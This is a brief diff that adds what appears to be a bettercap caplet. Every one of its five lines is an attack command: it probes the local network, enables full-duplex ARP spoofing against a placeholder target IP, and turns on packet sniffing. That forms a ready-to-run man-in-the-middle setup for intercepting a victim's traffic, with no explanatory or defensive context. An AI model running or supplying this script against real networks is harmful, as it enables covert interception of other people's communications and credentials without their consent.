@@ -1,0 +1,5 @@
+net.probe on
+set arp.spoof.fullduplex true
+set arp.spoof.targets $TARGET_IP
+arp.spoof on
+net.sniff on
